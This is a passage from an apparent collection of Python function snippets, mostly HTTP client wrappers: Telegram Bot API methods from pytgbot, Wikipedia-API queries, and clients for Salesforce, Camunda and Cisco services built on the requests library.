                os.write(fd, chunk)
                # don't use chunk_size, as it might be less
                total += len(chunk)
                if max_size > 0 and total >= max_size:
                    break
            return total 
**************************************
def rest_tb_file_dnload_to_fd(self, fd, remote_filename):
        """
        Download a remote file from the broker to a local file

        :param str remote_filename: filename in the broker's user
          storage area
        :params int fd: file descriptor where to write the data to
        """
        url = "files/%s" % remote_filename
        with contextlib.closing(self.send_request("GET", url, data = {},
                                                  stream = True,
                                                  raw = True)) as r:
            # http://docs.python-requests.org/en/master/user/quickstart/#response-content
            chunk_size = 1024
            total = 0
            for chunk in r.iter_content(chunk_size):
                os.write(fd, chunk)
                total += len(chunk)
            return total 
**************************************
def rest_tb_target_console_read_to_fd(self, fd, rt, console, offset,
                                          max_size = 0, ticket = ''):
        url = "targets/%s/console/" % rt['id']
        data = {
            'offset': offset,
        }
        if console:
            data['console'] = console
        if ticket != '':
            data['ticket'] = ticket
        with contextlib.closing(self.send_request("GET", url, data = data,
                                                  stream = True,
                                                  raw = True)) as r:
            # http://docs.python-requests.org/en/master/user/quickstart/#response-content
            chunk_size = 1024
            total = 0
            for chunk in r.iter_content(chunk_size):
                os.write(fd, chunk)
                # don't use chunk_size, as it might be less
                total += len(chunk)
                if max_size > 0 and total >= max_size:
                    break
            return total 
**************************************
def infer_msg(self, tts, rsp):
        """Attempt to guess what went wrong by using known
        information (e.g. http response) and observed behaviour

        """
        # rsp should be <requests.Response>
        # http://docs.python-requests.org/en/master/api/
        status = rsp.status_code
        reason = rsp.reason

        cause = "Unknown"
        if status == 403:
            cause = "Bad token or upstream API changes"
        elif status == 404 and not tts.lang_check:
            cause = "Unsupported language '%s'" % self.tts.lang
        elif status >= 500:
            cause = "Uptream API error. Try again later."

        return "%i (%s) from TTS API. Probable cause: %s" % (
            status, reason, cause) 
**************************************
def __init__(self, api_key, return_python_objects=True):
        """
        A Bot instance. From here you can call all the functions.
        The api key can be optained from @BotFather, see https://core.telegram.org/bots#6-botfather

        :param api_key: The API key. Something like "ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
        :type  api_key: str

        :param return_python_objects: If it should convert the json to `pytgbot.api_types.**` objects. Default: `True`
        :type  return_python_objects: bool
        """
        from datetime import datetime

        if api_key is None or not api_key:
            raise ValueError("No api_key given.")
        self.api_key = api_key
        self.return_python_objects = return_python_objects
        self._last_update = datetime.now()
        self._id = None        # will be filled when using the property .id or .username, or when calling ._load_info()
        self._username = None  # will be filled when using the property .id or .username, or when calling ._load_info()
    # end def __init__ 
**************************************
def delete_webhook(self):
        """
        Use this method to remove webhook integration if you decide to switch back to getUpdates. Returns True on success. Requires no parameters.

        https://core.telegram.org/bots/api#deletewebhook

        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        result = self.do("deleteWebhook")
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def delete_webhook 
**************************************
def __init__(self, api_key, return_python_objects=True):
        """
        A Bot instance. From here you can call all the functions.
        The api key can be optained from @BotFather, see https://core.telegram.org/bots#6-botfather

        :param api_key: The API key. Something like "ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
        :type  api_key: str

        :param return_python_objects: If it should convert the json to `pytgbot.api_types.**` objects. Default: `True`
        :type  return_python_objects: bool
        """
        from datetime import datetime

        if api_key is None or not api_key:
            raise ValueError("No api_key given.")
        self.api_key = api_key
        self.return_python_objects = return_python_objects
        self._last_update = datetime.now()
        self._id = None        # will be filled when using the property .id or .username, or when calling ._load_info()
        self._username = None  # will be filled when using the property .id or .username, or when calling ._load_info()
    # end def __init__ 
**************************************
def get_session():
    global session
    if session is None:
        session = requests.Session()
        session.headers = {
            # https://toolbelt.readthedocs.org/en/latest/user-agent.html#user-agent-constructor
            'User-Agent': user_agent('Deis Controller', deis_version),
        }
        # `mount` a custom adapter that retries failed connections for HTTP and HTTPS requests.
        # http://docs.python-requests.org/en/latest/api/#requests.adapters.HTTPAdapter
        session.mount('http://', requests.adapters.HTTPAdapter(max_retries=10))
        session.mount('https://', requests.adapters.HTTPAdapter(max_retries=10))
    return session 
**************************************
def __encode_msg(self, msg):
        if isinstance(msg, str):
            msg = msg.encode('utf-8')
        return msg

    # http://docs.python.org/2/library/httplib.html 
**************************************
def __call__(self, r):
        """
        Add Tendl Bearer Token into header of the request.

        For full description, see requests documentation:
        http://docs.python-requests.org/en/master/user/authentication/
        """
        headers = {
            "Authorization": "Bearer {}".format(self.__bearer_token),
            }
        r.prepare_headers(headers)
        return r 
**************************************
def _get_data(self, url, instance):
        ssl_params = {
            'ssl': instance.get('ssl'),
            'ssl_keyfile': instance.get('ssl_keyfile'),
            'ssl_certfile': instance.get('ssl_certfile'),
            'ssl_verify': instance.get('ssl_verify'),
        }
        for key, param in ssl_params.items():
            if param is None:
                del ssl_params[key]

        # Load SSL configuration, if available.
        # ssl_verify can be a bool or a string (http://docs.python-requests.org/en/latest/user/advanced/#ssl-cert-verification)
        if isinstance(ssl_params.get('ssl_verify'), bool) or isinstance(ssl_params.get('ssl_verify'), basestring):
            verify = ssl_params.get('ssl_verify')
        else:
            verify = None
        if ssl_params.get('ssl_certfile') and ssl_params.get('ssl_keyfile'):
            cert = (ssl_params.get('ssl_certfile'), ssl_params.get('ssl_keyfile'))
        elif ssl_params.get('ssl_certfile'):
            cert = ssl_params.get('ssl_certfile')
        else:
            cert = None

        resp = requests.get(
            url,
            timeout=10,
            verify=verify,
            cert=cert
        )
        resp.raise_for_status()
        return resp.json() 
**************************************
def communicate_with(self, endpoint, payload=None, cache=False):
        """Sends an HTTP request to the specified endpoint.

        @param endpoint An Endpoint subclass instance.
        @param payload A pycamunda.entity.RequestsInput implementation containing to be sent along with the request.
        @param cache Whether the response should be cached.
        If not set to True, the internal cache will never be used.
        If set to True, the first request for an endpoint will contact the remote while subsequent requests return the cached response.
        @returns An instance of @p endpoint.return_type.
        @see http://docs.python-requests.org/en/master/api/#requests.request
        """
        if cache and endpoint in self.cache:
            return self.cache[endpoint]
        request_kwargs = {'auth': self.auth, 'headers': endpoint.headers, 'timeout': endpoint.timeout,
                          'params': endpoint.params}
        if payload is not None:
            request_kwargs.update(payload.to_requests())
        url = self.base_url + endpoint.uri
        log.debug('Sending request to Camunda endpoint %s', url)
        response = requests.request(endpoint.method, url, **request_kwargs)
        # TODO: Deal with standard api exceptions
        if response.status_code == 400:
            raise BadRequest(response)
        if response.status_code == 404:
            raise ResourceNotFound(response)

        if endpoint.return_type is None:
            return None

        cleaned_response = response.text.replace(')]}\'\n', '', 1)
        response = endpoint.return_type(cleaned_response)
        if cache:
            self.cache[endpoint] = response
        return response 
**************************************
def __init__(self, session_id, instance_url, **kwargs):
        """ Constructor.

            :param: session_id: Session ID used to make request
            :type: session_id: string
            :param: instance_url: Instance URL used to make the request (eg. `'eu11.salesforce.com'`)
            :type: instance_url: string
            :param: **kwargs: kwargs
            :type: **kwargs: dict
            :Keyword Arguments:
                * *api_version* (`string`) --
                    API version for the request
                    Default: `'37.0'`
                * *http_method* (`string`) --
                    HTTP method for the request
                    Default: `'GET'`
                * *proxies* (`dict`) --
                    A dict containing proxies to be used by `requests` module. Ex:
                        `{"https": "example.org:443"}`
                    Default: `None`
                * *timeout* (`string`) --
                    A dict indicating the timeout value for connect and read to be used by `requests` module. Ex:
                        `{"timeout": "30"}`
                    Default: `None`
                * *request_body* (`dict`) --
                    A dict containing the request body
                    Default: `None`
        """
        self.proxies = kwargs.get('proxies', None)
        self.session_id = session_id
        self.http_method = kwargs.get('http_method', 'GET')
        self.instance_url = instance_url
        self.request_body = kwargs.get('request_body', None)
        self.api_version = kwargs.get('version', DEFAULT_API_VERSION)
        self.timeout = float(kwargs['timeout']) if 'timeout' in kwargs else None
        self.service = None
        self.status = None
        self.response = None
        self.headers = None
        self.request_url = None
        self.exceptions = [] 
**************************************
def set_proxies(self, proxies):
        """ Sets `proxies` for this class.

        :param proxies: A dict containing proxies to use (see: # noqa
        `Proxies <http://docs.python-requests.org/en/master/user/advanced/#proxies)>`_ # noqa
        in the python-requests.org guide.

        :type: dict
        """
        self.proxies = proxies 
**************************************
def _set_attributes(self, r):
        x = IseErsRequest(inspect.stack()[1][3])
        # http://docs.python-requests.org/en/master/api/#requests.Response
        x.response = r
        x.status_code = r.status_code
        x.reason = r.reason
        x.headers = r.headers
        x.encoding = r.encoding
        self._log(DEBUG2, r.encoding)
        self._log(DEBUG2, r.request.headers)  # XXX authorization header
        self._log(DEBUG2, r.headers)
        x.content = r.content  # bytes
        x.text = r.text  # Unicode
        self._log(DEBUG3, r.text)
        try:
            x.xml_root = etree.fromstring(r.content)
        except etree.ParseError as e:
            self._log(DEBUG1, 'ElementTree.fromstring ParseError: %s', e)

        if x.xml_root is not None:
            self._log(DEBUG1, 'root tag: %s', x.xml_root.tag)
            if x.xml_root.tag == '{ers.ise.cisco.com}ersResponse':
                message = x.xml_root.find('messages/message')
                if message is not None:
                    x.obj = {}
                    x.obj['error'] = {}
                    for k in ['type', 'code']:
                        if k in message.attrib:
                            x.obj['error'][k] = message.attrib[k]
                    title = message.findall('title')
                    if title is not None:
                        x.obj['error']['title'] = []
                        for elem in title:
                            x.obj['error']['title'].append(elem.text)

                    self._log(DEBUG2, x.obj)

        return x 
**************************************
def __init__(
            self,
            language: str = 'en',
            extract_format: ExtractFormat = ExtractFormat.WIKI,
            headers: Optional[Dict[str, Any]] = None,
            **kwargs
    ) -> None:
        """
        Constructs Wikipedia object for extracting information Wikipedia.

        :param language: Language mutation of Wikipedia -
                http://meta.wikimedia.org/wiki/List_of_Wikipedias
        :param extract_format: Format used for extractions
                :class:`ExtractFormat` object.
        :param headers:  Headers sent as part of HTTP request
        :param kwargs: Optional parameters used in -
                http://docs.python-requests.org/en/master/api/#requests.request

        Examples:

        * Use proxy: ``Wikipedia('en', proxies={'http': 'http://localhost:1234'})``
        """
        kwargs.setdefault('timeout', 10.0)

        self.language = language.strip().lower()
        self.extract_format = extract_format
        default_headers = dict() if headers is None else headers
        default_headers.setdefault(
            'User-Agent',
            'Wikipedia-API (https://github.com/martin-majlis/Wikipedia-API)'
        )
        self._session = requests.Session()
        self._session.headers.update(default_headers)
        self._request_kwargs = kwargs 
**************************************
def info(
            self,
            page: 'WikipediaPage'
    ) -> 'WikipediaPage':
        """
        https://www.mediawiki.org/w/api.php?action=help&modules=query%2Binfo
        https://www.mediawiki.org/wiki/API:Info
        """
        params = {
            'action': 'query',
            'prop': 'info',
            'titles': page.title,
            'inprop': '|'.join([
                'protection',
                'talkid',
                'watched',
                'watchers',
                'visitingwatchers',
                'notificationtimestamp',
                'subjectid',
                'url',
                'readable',
                'preload',
                'displaytitle'
            ])
        }
        raw = self._query(
            page,
            params
        )
        self._common_attributes(raw['query'], page)
        pages = raw['query']['pages']
        for k, v in pages.items():
            if k == '-1':
                page._attributes['pageid'] = -1
                return page
            else:
                return self._build_info(v, page)
        return page 
**************************************
def categories(
            self,
            page: 'WikipediaPage',
            **kwargs
    ) -> PagesDict:
        """
        Returns categories for page with respect to parameters

        API Calls for parameters:

        - https://www.mediawiki.org/w/api.php?action=help&modules=query%2Bcategories
        - https://www.mediawiki.org/wiki/API:Categories

        :param page: :class:`WikipediaPage`
        :param kwargs: parameters used in API call
        :return: categories for page
        """

        params = {
            'action': 'query',
            'prop': 'categories',
            'titles': page.title,
            'cllimit': 500,
        }

        used_params = kwargs
        used_params.update(params)

        raw = self._query(
            page,
            used_params
        )
        self._common_attributes(raw['query'], page)
        pages = raw['query']['pages']
        for k, v in pages.items():
            if k == '-1':
                page._attributes['pageid'] = -1
                return {}
            else:
                return self._build_categories(v, page)
        return {} 
**************************************
def langlinks(self) -> PagesDict:
        """
        Returns all language links to pages in other languages.

        This is wrapper for:

        * https://www.mediawiki.org/w/api.php?action=help&modules=query%2Blanglinks
        * https://www.mediawiki.org/wiki/API:Langlinks

        :return: :class:`PagesDict`
        """
        if not self._called['langlinks']:
            self._fetch('langlinks')
        return self._langlinks 
**************************************
def links(self) -> PagesDict:
        """
        Returns all pages linked from the current page.

        This is wrapper for:

        * https://www.mediawiki.org/w/api.php?action=help&modules=query%2Blinks
        * https://www.mediawiki.org/wiki/API:Links

        :return: :class:`PagesDict`
        """
        if not self._called['links']:
            self._fetch('links')
        return self._links 
**************************************
def categories(self) -> PagesDict:
        """
        Returns categories associated with the current page.

        This is wrapper for:

        * https://www.mediawiki.org/w/api.php?action=help&modules=query%2Bcategories
        * https://www.mediawiki.org/wiki/API:Categories

        :return: :class:`PagesDict`
        """
        if not self._called['categories']:
            self._fetch('categories')
        return self._categories 
**************************************
def categorymembers(self) -> PagesDict:
        """
        Returns all pages belonging to the current category.

        This is wrapper for:

        * https://www.mediawiki.org/w/api.php?action=help&modules=query%2Bcategorymembers
        * https://www.mediawiki.org/wiki/API:Categorymembers

        :return: :class:`PagesDict`
        """
        if not self._called['categorymembers']:
            self._fetch('categorymembers')
        return self._categorymembers 
**************************************
def __init__(self, cuc, username, password, verify=False, disable_warnings=False, timeout=2):
        """
        Sets up the connection to Cisco Unity Connection

        :param cuc: Unity connection IP Address
        :param username: User with privilege to access rest api
        :param password: Users password
        :param verify: Verify SSL certificate
        :param disable_warnings: Disable console warnings if ssl cert invalid
        :param timeout: Timeout for request response
        """

        self.url_base = 'https://{0}/vmrest'.format(cuc)
        self.cuc = requests.session()
        self.cuc.auth = (username, password)
        self.cuc.verify = verify  # http://docs.python-requests.org/en/latest/user/advanced/#ssl-cert-verification
        self.disable_warnings = disable_warnings
        self.timeout = timeout
        self.cuc.headers.update({
            'Accept': 'application/json',
            'Connection': 'keep_alive',
            'Content_type': 'application/json',
        })

        if self.disable_warnings:
            requests.packages.urllib3.disable_warnings() 
**************************************
def _do_request(self, url, params=None, files=None, use_long_polling=None, request_timeout=None):
        """

        :param url: The complete url to send to
        :type  url: str

        :keyword params: Parameter for that connection

        :keyword files: Optional files parameters

        :keyword use_long_polling: if it should use long polling.
                                (see http://docs.python-requests.org/en/latest/api/#requests.Response.iter_content)
        :type    use_long_polling: bool

        :keyword request_timeout: When the request should time out.
        :type    request_timeout: int

        :return: json data received
        :rtype: DictObject.DictObject
        """
        import requests
        r = requests.post(url, params=params, files=files, stream=use_long_polling,
                          verify=True, timeout=request_timeout)
        # No self signed certificates. Telegram should be trustworthy anyway...
        from DictObject import DictObject
        try:
            logger.debug("Response: {}".format(r.json()))
            json_data = DictObject.objectify(r.json())
        except Exception:
            logger.exception("Parsing answer failed.\nRequest: {r!s}\nContent: {r.content}".format(r=r))
            raise
        # end if
        json_data["response"] = r  # TODO: does this failes on json lists? Does TG does that?
        return json_data
    # end def 
**************************************
def get_webhook_info(self):
        """
        Use this method to get current webhook status.
        Requires no parameters.
        If the bot is using get_updates, will return an object with the url field empty.

        https://core.telegram.org/bots/api#getwebhookinfo


        Returns:

        :return: On success, returns a :class:`pytgbot.api_types.receivable.updates.WebhookInfo` object
        :rtype:  pytgbot.api_types.receivable.updates.WebhookInfo
        """
        result = self.do("getWebhookInfo")
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.updates import WebhookInfo
            try:
                return WebhookInfo.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type WebhookInfo", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def get_webhook_info 
**************************************
def export_chat_invite_link(self, chat_id):
        """
        Use this method to generate a new invite link for a chat; any previously generated link is revoked. The bot must be an administrator in the chat for this to work and must have the appropriate admin rights. Returns the new invite link as String on success.

        Note: Each administrator in a chat generates their own invite links. Bots can't use invite links generated by other administrators. If you want your bot to work with invite links, it will need to generate its own link using exportChatInviteLink – after this the link will become available to the bot via the getChat method. If your bot needs to generate a new invite link replacing its previous one, use exportChatInviteLink again.


        https://core.telegram.org/bots/api#exportchatinvitelink


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode


        Returns:

        :return: Returns the new invite link as String on success
        :rtype:  str|unicode
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        result = self.do("exportChatInviteLink", chat_id=chat_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(str, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive str", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def export_chat_invite_link 
**************************************
def delete_chat_photo(self, chat_id):
        """
        Use this method to delete a chat photo. Photos can't be changed for private chats. The bot must be an administrator in the chat for this to work and must have the appropriate admin rights. Returns True on success.

        Note: In regular groups (non-supergroups), this method will only work if the ‘All Members Are Admins’ setting is off in the target group.

        https://core.telegram.org/bots/api#deletechatphoto


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode


        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        result = self.do("deleteChatPhoto", chat_id=chat_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def delete_chat_photo 
**************************************
def set_chat_title(self, chat_id, title):
        """
        Use this method to change the title of a chat. Titles can't be changed for private chats. The bot must be an administrator in the chat for this to work and must have the appropriate admin rights. Returns True on success.

        Note: In regular groups (non-supergroups), this method will only work if the ‘All Members Are Admins’ setting is off in the target group.

        https://core.telegram.org/bots/api#setchattitle


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target channel (in the format @channelusername)
        :type  chat_id: int | str|unicode

        :param title: New chat title, 1-255 characters
        :type  title: str|unicode


        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        assert_type_or_raise(title, unicode_type, parameter_name="title")

        result = self.do("setChatTitle", chat_id=chat_id, title=title)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def set_chat_title 
**************************************
def unpin_chat_message(self, chat_id):
        """
        Use this method to unpin a message in a supergroup or a channel.
        The bot must be an administrator in the chat for this to work and must have the ‘can_pin_messages’ admin right
        in the supergroup or ‘can_edit_messages’ admin right in the channel. Returns True on success.

        https://core.telegram.org/bots/api#unpinchatmessage


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target supergroup/channel (in the format @username)
        :type  chat_id: int | str|unicode


        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        result = self.do("unpinChatMessage", chat_id=chat_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def unpin_chat_message 
**************************************
def leave_chat(self, chat_id):
        """
        Use this method for your bot to leave a group, supergroup or channel. Returns True on success.

        https://core.telegram.org/bots/api#leavechat


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target supergroup or channel (in the
                        format @channelusername)
        :type  chat_id: int | str|unicode


        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        result = self.do("leaveChat", chat_id=chat_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def leave_chat 
**************************************
def get_chat(self, chat_id):
        """
        Use this method to get up to date information about the chat (current name of the user for one-on-one
        conversations, current username of a user, group or channel, etc.)

        Returns a Chat object on success.

        https://core.telegram.org/bots/api#getchat


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target supergroup or channel (in the
                        format @channelusername)
        :type  chat_id: int | str|unicode


        Returns:

        :return: Returns a Chat object on success
        :rtype:  pytgbot.api_types.receivable.peer.Chat
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        result = self.do("getChat", chat_id=chat_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.peer import Chat
            try:
                return Chat.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type Chat", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def get_chat 
**************************************
def get_chat_administrators(self, chat_id):
        """
        Use this method to get a list of administrators in a chat.

        On success, returns an Array of ChatMember objects that contains information about all chat administrators
        except other bots. If the chat is a group or a supergroup and no administrators were appointed,
        only the creator will be returned.

        https://core.telegram.org/bots/api#getchatadministrators


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target supergroup or channel (in the
                        format @channelusername)
        :type  chat_id: int | str|unicode


        Returns:

        :return: On success, returns an Array of ChatMember objects that contains information about all
                 chat administrators except other bots
        :rtype:  list of pytgbot.api_types.receivable.peer.ChatMember
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        result = self.do("getChatAdministrators", chat_id=chat_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.peer import ChatMember
            try:
                return ChatMember.from_array_list(result, list_level=1)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type ChatMember", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def get_chat_administrators 
**************************************
def get_chat_member(self, chat_id, user_id):
        """
        Use this method to get information about a member of a chat. Returns a ChatMember object on success.

        https://core.telegram.org/bots/api#getchatmember


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target supergroup or channel (in the
                         format @channelusername)
        :type  chat_id: int | str|unicode

        :param user_id: Unique identifier of the target user
        :type  user_id: int


        Returns:

        :return: Returns a ChatMember object on success
        :rtype:  pytgbot.api_types.receivable.peer.ChatMember
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        assert_type_or_raise(user_id, int, parameter_name="user_id")

        result = self.do("getChatMember", chat_id=chat_id, user_id=user_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.peer import ChatMember
            try:
                return ChatMember.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type ChatMember", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def get_chat_member 
**************************************
def set_chat_sticker_set(self, chat_id, sticker_set_name):
        """
        Use this method to set a new group sticker set for a supergroup. The bot must be an administrator in the chat for this to work and must have the appropriate admin rights. Use the field can_set_sticker_set optionally returned in getChat requests to check if the bot can use this method. Returns True on success.

        https://core.telegram.org/bots/api#setchatstickerset


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target supergroup (in the format @supergroupusername)
        :type  chat_id: int | str|unicode

        :param sticker_set_name: Name of the sticker set to be set as the group sticker set
        :type  sticker_set_name: str|unicode


        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        assert_type_or_raise(sticker_set_name, unicode_type, parameter_name="sticker_set_name")

        result = self.do("setChatStickerSet", chat_id=chat_id, sticker_set_name=sticker_set_name)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def set_chat_sticker_set 
**************************************
def delete_chat_sticker_set(self, chat_id):
        """
        Use this method to delete a group sticker set from a supergroup. The bot must be an administrator in the chat for this to work and must have the appropriate admin rights. Use the field can_set_sticker_set optionally returned in getChat requests to check if the bot can use this method. Returns True on success.

        https://core.telegram.org/bots/api#deletechatstickerset


        Parameters:

        :param chat_id: Unique identifier for the target chat or username of the target supergroup (in the format @supergroupusername)
        :type  chat_id: int | str|unicode


        Returns:

        :return: Returns True on success
        :rtype:  bool
        """
        assert_type_or_raise(chat_id, (int, unicode_type), parameter_name="chat_id")

        result = self.do("deleteChatStickerSet", chat_id=chat_id)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def delete_chat_sticker_set 
**************************************
def get_sticker_set(self, name):
        """
        Use this method to get a sticker set. On success, a StickerSet object is returned.

        https://core.telegram.org/bots/api#getstickerset


        Parameters:

        :param name: Name of the sticker set
        :type  name: str|unicode


        Returns:

        :return: On success, a StickerSet object is returned
        :rtype: pytgbot.api_types.receivable.stickers.StickerSet
        """
        assert_type_or_raise(name, unicode_type, parameter_name="name")

        result = self.do("getStickerSet", name=name)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.stickers import StickerSet
            try:
                return StickerSet.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type StickerSet", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def get_sticker_set 
**************************************
def upload_sticker_file(self, user_id, png_sticker):
        """
        Use this method to upload a .png file with a sticker for later use in createNewStickerSet and addStickerToSet methods (can be used multiple times). Returns the uploaded File on success.

        https://core.telegram.org/bots/api#uploadstickerfile


        Parameters:

        :param user_id: User identifier of sticker file owner
        :type  user_id: int

        :param png_sticker: Png image with the sticker, must be up to 512 kilobytes in size, dimensions must not exceed 512px, and either width or height must be exactly 512px.
        :type  png_sticker: pytgbot.api_types.sendable.files.InputFile


        Returns:

        :return: Returns the uploaded File on success
        :rtype: pytgbot.api_types.receivable.media.File
        """
        from pytgbot.api_types.sendable.files import InputFile

        assert_type_or_raise(user_id, int, parameter_name="user_id")

        assert_type_or_raise(png_sticker, InputFile, parameter_name="png_sticker")

        result = self.do("uploadStickerFile", user_id=user_id, png_sticker=png_sticker)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            from pytgbot.api_types.receivable.media import File
            try:
                return File.from_array(result)
            except TgApiParseException:
                logger.debug("Failed parsing as api_type File", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def upload_sticker_file 
**************************************
def set_sticker_position_in_set(self, sticker, position):
        """
        Use this method to move a sticker in a set created by the bot to a specific position . Returns True on success.

        https://core.telegram.org/bots/api#setstickerpositioninset


        Parameters:

        :param sticker: File identifier of the sticker
        :type  sticker: str|unicode

        :param position: New sticker position in the set, zero-based
        :type  position: int


        Returns:

        :return: Returns True on success
        :rtype: bool
        """
        assert_type_or_raise(sticker, unicode_type, parameter_name="sticker")

        assert_type_or_raise(position, int, parameter_name="position")

        result = self.do("setStickerPositionInSet", sticker=sticker, position=position)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def set_sticker_position_in_set 
**************************************
def delete_sticker_from_set(self, sticker):
        """
        Use this method to delete a sticker from a set created by the bot. Returns True on success.

        https://core.telegram.org/bots/api#deletestickerfromset


        Parameters:

        :param sticker: File identifier of the sticker
        :type  sticker: str|unicode


        Returns:

        :return: Returns True on success
        :rtype: bool
        """
        assert_type_or_raise(sticker, unicode_type, parameter_name="sticker")

        result = self.do("deleteStickerFromSet", sticker=sticker)
        if self.return_python_objects:
            logger.debug("Trying to parse {data}".format(data=repr(result)))
            try:
                return from_array_list(bool, result, list_level=0, is_builtin=True)
            except TgApiParseException:
                logger.debug("Failed parsing as primitive bool", exc_info=True)
            # end try
            # no valid parsing so far
            raise TgApiParseException("Could not parse result.")  # See debug log for details!
        # end if return_python_objects
        return result
    # end def delete_sticker_from_set 
**************************************
